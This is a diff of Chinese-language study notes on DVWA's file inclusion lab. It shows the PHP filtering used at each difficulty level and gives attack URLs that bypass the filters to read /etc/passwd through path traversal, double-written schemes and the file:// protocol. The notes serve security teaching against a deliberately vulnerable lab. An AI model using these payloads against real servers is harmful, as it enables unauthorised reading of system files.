@@ -800,21 +800,91 @@ http://192.168.1.250/DVWA/vulnerabilities/fi/? page=http://www.google.com
 
 // The page we wish to display 
 $file = $_GET[ 'page' ]; 
-//伺服器端對page參數沒有做任何的過濾跟檢查
+//伺服器端對page參數沒有做任何的(輸入驗證)[過濾跟檢查]
 ?> 
 ```
 
+
+
+
 ### Medium
 ***
+如何避免File inclusion vulnerability??
+使用PHP str_replace() 函数過濾掉不該出現的咚咚
+
+伺服器程式分析
 ```
+<?php
+
+// The page we wish to display
+$file = $_GET[ 'page' ];
+
+// Input validation(輸入驗證)
+$file = str_replace( array( "http://", "https://" ), "", $file );
+$file = str_replace( array( "../", "..\"" ), "", $file );
+
+?> 
 ```
+但是還是可以進行攻擊==>使用雙寫繞過替換規則
+
+```
+LFI 攻擊測試==>
+http://192.168.2.119/DVWA/vulnerabilities/fi/?page=..//etc/passwd
+
+RFI 攻擊測試==>
+http://192.168.2.119/DVWA/vulnerabilities/fi/?page=hthttp://tp://google.com
+```
+
+
 ### High
 ***
+
+>* 嚴格定義include的檔案名稱是file開頭[file1.php, file2.php , file3.php ]
+
+伺服器程式分析
 ```
+<?php
+
+// The page we wish to display
+$file = $_GET[ 'page' ];
+
+// Input validation(輸入驗證)
+if( !fnmatch( "file*", $file ) && $file != "include.php" ) {
+    // This isn't the page we want!
+    echo "ERROR: File not found!";
+    exit;
+}
+
+?> 
+```
+使用了fnmatch函數檢查page參數，要求page參數的開頭必須是file，伺服器才會去包含相應的檔
+
+攻擊測試
+```
+LFI 攻擊測試==>利用file協定
+http://192.168.1.250/DVWA/vulnerabilities/fi/?page=file:///etc/passwd
+
+比較看看
+http://192.168.1.250/DVWA/vulnerabilities/fi/?page=/etc/passwd
+
+RFI 攻擊測試==>無法攻擊
 ```
 ### Impossible
 ***
 ```
+<?php
+
+// The page we wish to display
+$file = $_GET[ 'page' ];
+
+// Only allow include.php or file{1..3}.php
+if( $file != "include.php" && $file != "file1.php" && $file != "file2.php" && $file != "file3.php" ) {
+    // This isn't the page we want!
+    echo "ERROR: File not found!";
+    exit;
+}
+
+?> 
 ```
 # File Upload（文件上傳）
 
